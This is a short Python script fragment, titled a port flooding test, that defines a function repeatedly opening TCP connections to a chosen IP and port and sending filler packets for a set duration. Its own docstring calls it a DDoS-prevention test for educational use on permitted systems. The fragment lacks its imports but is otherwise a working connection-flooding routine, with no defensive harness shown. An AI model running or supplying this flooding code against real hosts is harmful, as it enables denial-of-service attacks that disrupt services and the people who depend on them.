#!/usr/bin/env python3
"""
Port Flooding Test Script

This script generates moderate traffic to test game DDoS prevention.
For EDUCATIONAL PURPOSES ONLY. Use only on systems you own or have permission to test.
"""

def flood_port_tcp(target_ip, port, packet_size, duration, delay):
    """Send TCP traffic to a specific port."""
    end_time = time.time() + duration
    packet = b"X" * packet_size
    
    print(f"Starting TCP traffic to {target_ip}:{port}")
    packets_sent = 0
    
    while time.time() < end_time:
        try:
            # Create a new TCP socket for each connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)  # Set timeout for connection attempts
            sock.connect((target_ip, port))
            sock.send(packet)
            packets_sent += 1
            sock.close()
            time.sleep(delay)
        except:
            pass
            
    print(f"Completed sending {packets_sent} TCP packets to {target_ip}:{port}")
